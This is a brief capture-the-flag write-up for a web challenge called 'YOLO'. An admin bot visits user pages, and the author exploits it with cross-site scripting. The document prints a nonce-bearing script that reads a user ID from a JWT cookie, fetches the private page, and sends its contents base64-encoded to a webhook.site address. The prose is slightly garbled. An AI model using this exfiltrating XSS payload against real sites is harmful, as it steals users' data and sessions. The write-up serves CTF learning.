# YOLO

**The challenge**

The challenge will as for your name and the thing you want to do. and then at the /do/userId page it shows what you want to do. There was an admin bot it will simply visit the page you give After entering the username and flag into the yolo page.

**the exploit**

Here it was an xss attack but



The script
```html
    <script nonce="6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36">
    let a = JSON.parse(atob(document.cookie.split("=")[1].split(".")[1]))["userId"];
    fetch("/do/" + a )
    .then((res) => res.text())
    .then((res) => (window.location = "https://webhook.site/5a267c3d-a359-4a27-b843-293a00d4ad5c?a=" + btoa(res)));
    </script>
```
Then base64 decode and wiil get the flag.

**The Flag**

Flag = tjctf{y0u_0n1y_1iv3_0nc3_5ab61b33}